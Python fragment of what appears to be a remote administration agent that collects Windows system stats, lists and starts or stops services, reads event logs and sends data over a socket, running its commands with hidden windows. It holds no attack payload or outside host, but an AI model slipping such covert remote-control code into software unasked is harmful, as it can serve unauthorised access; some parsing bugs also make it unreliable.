def get_system_stats():
    """Get system statistics"""
    stats = {
        "cpu": {},
        "memory": {},
        "disk": [],
        "network": {}
    }
    
    try:
        # CPU
        if sys.platform == "win32":
            result = subprocess.run(
                ['wmic', 'cpu', 'get', 'loadpercentage,name', '/format:list'],
                capture_output=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
            )
            output = result.stdout.decode("cp437", errors="replace")
            for line in output.split('\n'):
                if 'LoadPercentage=' in line:
                    stats["cpu"]["usage"] = line.split('=')[1].strip() + "%"
                if 'Name=' in line and stats["cpu"].get("name"):
                    stats["cpu"]["name"] = line.split('=')[1].strip()
        stats["cpu"]["name"] = platform.processor() or "Unknown"
    except Exception:
        stats["cpu"]["usage"] = "N/A"
        stats["cpu"]["name"] = platform.processor()
    
    try:
        # Memory
        if sys.platform == "win32":
            result = subprocess.run(
                ['systeminfo', '/fo', 'list'],
                capture_output=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW
            )
            output = result.stdout.decode("cp437", errors="replace")
            for line in output.split('\n'):
                if 'Total Physical Memory:' in line:
                    stats["memory"]["total"] = line.split(':')[1].strip()
                elif 'Available Physical Memory:' in line:
                    stats["memory"]["available"] = line.split(':')[1].strip()
        else:
            import psutil
            mem = psutil.virtual_memory()
            stats["memory"]["total"] = f"{mem.total / (1024**3):.1f} GB"
            stats["memory"]["available"] = f"{mem.available / (1024**3):.1f} GB"
    except Exception:
        stats["memory"] = {"total": "N/A", "available": "N/A"}
    
    try:
        # Disk
        if sys.platform == "win32":
            result = subprocess.run(
                ['wmic', 'logicaldisk', 'get', 'caption,freespace,size,drivetype', '/format:list'],
                capture_output=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
            )
            output = result.stdout.decode("cp437", errors="replace")
            current_drive = {}
            for line in output.split('\n'):
                if 'Caption=' in line:
                    if current_drive:
                        stats["disk"].append(current_drive)
                    current_drive = {"drive": line.split('=')[1].strip()}
                elif 'FreeSpace=' in line and 'FreeSpace=' in line:
                    try:
                        free = int(line.split('=')[1].strip())
                        current_drive["free"] = f"{free / (1024**3):.1f} GB"
                    except Exception:
                        current_drive["free"] = "N/A"
                elif 'Size=' in line:
                    try:
                        size = int(line.split('=')[1].strip())
                        current_drive["total"] = f"{size / (1024**3):.1f} GB"
                    except Exception:
                        current_drive["total"] = "N/A"
                elif 'DriveType=' in line:
                    current_drive["type"] = line.split('=')[1].strip()
            if current_drive:
                stats["disk"].append(current_drive)
    except Exception:
        pass
    
    return stats

def get_services_list():
    """Get services list"""
    services = []
    try:
        if sys.platform == "win32":
            result = subprocess.run(
                ['sc', 'query', 'state=', 'all'],
                capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW
            )
            output = result.stdout.decode("cp437", errors="replace")
            
            current_service = {}
            for line in output.split('\n'):
                line = line.strip()
                if line.startswith('SERVICE_NAME:'):
                    if current_service:
                        services.append(current_service)
                    current_service = {"name": line.split(':', 1)[1].strip()}
                elif line.startswith('DISPLAY_NAME:'):
                    current_service["display_name"] = line.split(':', 1)[1].strip()
                elif line.startswith('STATE') and ':' in line:
                    state = line.split(':', 1)[1].strip().split()[0]
                    state_map = {"1": "Stopped", "2": "Starting", "3": "Running", "4": "Stopping", "5": "Stopped", "6": "Stopping", "7": "Paused", "8": "Paused"}
                    current_service["state"] = state_map.get(state, state)
            if current_service:
                services.append(current_service)
    except Exception:
        pass
    return services

def control_service(service_name, action):
    """Control service"""
    try:
        if sys.platform == "win32":
            if action == "start":
                result = subprocess.run(['sc', 'start', service_name], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
            elif action == "stop":
                result = subprocess.run(['sc', 'stop', service_name], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
            elif action == "restart":
                subprocess.run(['sc', 'stop', service_name], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
                time.sleep(2)
                result = subprocess.run(['sc', 'start', service_name], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                return f"Unknown action: {action}"
            
            return "OK" if result.returncode in [0, 1060] else f"Failed: {result.stderr.decode()}"
    except Exception as e:
        return str(e)
    return "Not supported on this platform"

def get_event_logs(log_type="Application", max_events=50):
    """Get event logs"""
    logs = []
    try:
        if sys.platform == "win32":
            result = subprocess.run(
                ['wevtutil', 'qe', log_type, '/c:' + str(max_events), '/f:xml'],
                capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW
            )
            output = result.stdout.decode("utf-8", errors="replace")
            
            import re
            # Extract events
            events = re.findall(r'<Event[^>]*>(.*?)</Event>', output, re.DOTALL)
            for event in events:
                try:
                    level = "Info"
                    if '<Level>1</Level>' in event:
                        level = "Critical"
                    elif '<Level>2</Level>' in event:
                        level = "Error"
                    elif '<Level>3</Level>' in event:
                        level = "Warning"
                    
                    time_match = re.search(r'<TimeCreated SystemTime=\'([^\']+)\'>', event)
                    time_created = time_match.group(1) if time_match else "Unknown"
                    
                    msg_match = re.search(r'<Data[^>]*>([^<]+)</Data>', event)
                    message = msg_match.group(1) if msg_match else "No message"
                    
                    logs.append({
                        "level": level,
                        "time": time_created,
                        "message": message[:200]  # Limit length
                    })
                except Exception:
                    continue
    except Exception:
        pass
    return logs

def _safe_send(sock, data):
    lock = _chat_lock
    if lock:
        lock.acquire()
    try:
        total = 0
        while total < len(data):
            sent = sock.send(data[total:])
            if sent == 0:
                break
            total += sent
    except Exception:
        pass
    finally:
        if lock:
            lock.release()

